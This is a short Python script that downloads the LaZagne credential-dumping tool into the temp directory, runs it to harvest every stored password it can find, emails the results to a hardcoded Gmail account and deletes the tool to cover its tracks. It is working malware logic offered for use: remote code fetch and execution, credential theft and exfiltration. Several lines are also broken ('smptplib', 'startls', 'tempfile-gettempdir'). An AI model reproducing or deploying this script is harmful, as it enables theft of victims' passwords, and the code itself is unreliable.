#!/usr/bin/env python

import requests
import subprocess
import smtplib
import os
import tempfile

# function to download a file from a url
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)

# function to send an email from gmail account
def send_mail(email, password, message):
    server = smptplib.SMTP("smtp.gmail.com",587)
    server.startls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

# get the temp directory
temp_directory = tempfile-gettempdir()
# change to the temp directory
os.chdir(temp_directory)
# download the file execute and report through email
download("some/url/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("my@Email.com","myPassword",result)
# remove the file 
os.remove("laZagne.exe")
